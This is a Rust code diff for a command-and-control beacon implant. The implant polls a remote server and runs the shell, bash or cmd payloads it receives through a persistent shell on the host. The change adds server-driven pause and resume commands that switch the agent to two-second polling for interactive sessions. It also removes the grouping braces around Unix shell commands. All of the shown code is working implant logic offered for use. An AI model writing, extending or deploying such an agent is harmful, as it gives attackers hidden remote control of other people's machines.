@@ -20,6 +20,7 @@ mod file_transfer;
 const DEFAULT_BEACON_INTERVAL_SECS: u64 = 30;
 const MIN_BEACON_INTERVAL_SECS: u64 = 5;
 const MAX_BEACON_INTERVAL_SECS: u64 = 3600;
+const SESSION_BEACON_INTERVAL_SECS: u64 = 2;
 const SHELL_SENTINEL: &str = "__C2_BEACON_DONE_7f3a9b2c__";
 const CMD_TIMEOUT_SECS: u64 = 30;
 
@@ -195,6 +196,7 @@ async fn main() {
 
     let mut session_key: Option<[u8; 32]> = None;
     let mut sleep_interval_secs = default_beacon_interval();
+    let mut beacon_paused = false;
 
     let client = Client::builder()
         .timeout(Duration::from_secs(30))
@@ -273,16 +275,27 @@ async fn main() {
                                                 }
                                             }
                                             for cmd in beacon_resp.commands {
-                                                execute_command(
-                                                    &client,
-                                                    &server_url,
-                                                    &agent_id,
-                                                    &auth_token,
-                                                    session_key.as_ref(),
-                                                    cmd,
-                                                    Arc::clone(&shell_state),
-                                                )
-                                                .await;
+                                                match cmd.command_type.as_str() {
+                                                    "beacon_pause" => {
+                                                        beacon_paused = true;
+                                                    }
+                                                    "beacon_resume" => {
+                                                        beacon_paused = false;
+                                                    }
+                                                    _ => {
+                                                        execute_command(
+                                                            &client,
+                                                            &server_url,
+                                                            &agent_id,
+                                                            &auth_token,
+                                                            session_key.as_ref(),
+                                                            cmd,
+                                                            Arc::clone(&shell_state),
+                                                            &mut beacon_paused,
+                                                        )
+                                                        .await;
+                                                    }
+                                                }
                                             }
                                         }
                                     }
@@ -311,7 +324,12 @@ async fn main() {
             session_key = None;
         }
 
-        sleep(Duration::from_secs(sleep_interval_secs)).await;
+        let wait_secs = if beacon_paused {
+            SESSION_BEACON_INTERVAL_SECS
+        } else {
+            sleep_interval_secs
+        };
+        sleep(Duration::from_secs(wait_secs)).await;
     }
 }
 
@@ -319,7 +337,7 @@ async fn run_shell_command(shell: &mut PersistentShell, command: &str) -> String
     let wrapped = if cfg!(target_os = "windows") {
         format!("{} 2>&1\r\necho {}\r\n", command, SHELL_SENTINEL)
     } else {
-        format!("{{ {}; }} 2>&1\necho {}\n", command, SHELL_SENTINEL)
+        format!("{} 2>&1\necho {}\n", command, SHELL_SENTINEL)
     };
 
     if shell.stdin.write_all(wrapped.as_bytes()).await.is_err() {
@@ -411,6 +429,7 @@ async fn execute_command(
     session_key: Option<&[u8; 32]>,
     cmd: PendingCommand,
     shell_state: Arc<Mutex<ShellState>>,
+    beacon_paused: &mut bool,
 ) {
     let output = match cmd.command_type.as_str() {
         "shell" | "bash" | "cmd" => execute_shell_persistent(&shell_state, &cmd.payload).await,
@@ -421,7 +440,8 @@ async fn execute_command(
                 let _ = sh.child.kill().await;
             }
             guard.kill();
-            String::from("Session terminated. Persistent shell killed. Working directory resets on next command.")
+            *beacon_paused = false;
+            String::from("Session terminated. Persistent shell killed. Beacon resumed.")
         }
         "sleep" => {
             if let Ok(secs) = cmd.payload.trim().parse::<u64>() {
